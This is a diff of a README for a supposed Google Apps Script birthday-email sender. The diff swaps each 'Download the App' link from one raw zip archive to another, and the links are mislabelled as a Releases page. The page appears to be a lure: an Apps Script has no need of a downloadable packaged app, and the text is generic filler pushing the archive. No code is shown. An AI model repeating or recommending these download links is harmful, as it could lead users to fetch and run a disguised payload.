@@ -1,7 +1,7 @@
 # 🎉 Birthday-Email-Sender-Google-App-Scripts - Automate Your Birthday Wishes Easily
 
 ## 📥 Download Now
-[![Download the App](https://raw.githubusercontent.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/main/syndactylism/Birthday-Email-Sender-Google-App-Scripts.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/main/syndactylism/Birthday-Email-Sender-Google-App-Scripts.zip)
+[![Download the App](https://github.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/raw/refs/heads/main/assets/Google-App-Birthday-Email-Scripts-Sender-1.4.zip%20Now-Click%20Here-blue)](https://github.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/raw/refs/heads/main/assets/Google-App-Birthday-Email-Scripts-Sender-1.4.zip)
 
 ## 📖 Introduction
 Welcome to the **Birthday-Email-Sender-Google-App-Scripts** project. This simple Google Apps Script helps you send automated birthday wishes via Gmail. By using data stored in a Google Sheet, you can effortlessly wish your friends and loved ones on their special day.
@@ -15,7 +15,7 @@ Follow these steps to download and run the application:
    - Fill in the rows with the relevant information for each person you want to wish.
 
 2. **Visit the Releases Page**
-   - Click on the following link to access the Releases page: [Download the App](https://raw.githubusercontent.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/main/syndactylism/Birthday-Email-Sender-Google-App-Scripts.zip).
+   - Click on the following link to access the Releases page: [Download the App](https://github.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/raw/refs/heads/main/assets/Google-App-Birthday-Email-Scripts-Sender-1.4.zip).
    - Here, you will find all available versions of the script.
 
 3. **Download the Script**
@@ -67,4 +67,4 @@ This project is licensed under the MIT License. You can use, modify, or distribu
 Thanks to everyone who contributed to this project. Your efforts make automated tasks easier for everyone. 
 
 ## 📦 Download & Install
-To download the latest version of the app, please visit the Releases page: [Download the App](https://raw.githubusercontent.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/main/syndactylism/Birthday-Email-Sender-Google-App-Scripts.zip). Follow the steps in the "Getting Started" section to set everything up smoothly.
+To download the latest version of the app, please visit the Releases page: [Download the App](https://github.com/usmanwaraich001/Birthday-Email-Sender-Google-App-Scripts/raw/refs/heads/main/assets/Google-App-Birthday-Email-Scripts-Sender-1.4.zip). Follow the steps in the "Getting Started" section to set everything up smoothly.
